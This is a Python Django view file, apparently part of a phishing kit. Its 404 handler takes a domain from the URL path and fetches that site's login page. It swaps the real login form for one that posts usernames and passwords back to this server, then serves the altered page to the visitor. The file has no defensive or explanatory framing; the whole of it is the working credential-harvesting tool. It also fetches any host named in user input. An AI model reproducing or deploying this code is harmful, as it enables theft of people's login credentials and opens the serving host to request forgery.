from django.http import HttpResponse
from django.shortcuts import render
import re
import requests
from bs4 import BeautifulSoup
from django.template import RequestContext, Template

def error_404_view(request, exception):
    str = request.get_full_path()
    print (str[1:])
    URL = "https://"+str[1:]+"/login"
    r = requests.get(URL)
    soup = r.content
    temparr = re.split("<form | </form>",soup.decode("utf-8"))
    print ("length = ",len(temparr))
    if(len(temparr) != 1):
        print ("---------------------------------------------------------------------------------------------------")
        print (temparr[0])
        print ("---------------------------------------------------------------------------------------------------")
        temparr[1] = "<form action='login?path="+str[1:]+"' method='post'>Username : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='text' name='mailid' id='mailid' placeholder='Username'><br><br>Password : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='password' name='password' id='password' placeholder='Password'><br><br><input type='submit' name='submit' value='Sign-In' id='submitbutton'></form>"
        print (temparr[0])

        tempstr = "".join(temparr)
        soup = BeautifulSoup(tempstr, 'html5lib')
        return HttpResponse(soup)
    else:
        data = {"url" : str[1:]}
        return render(request,'wrong.html',{"data" : data })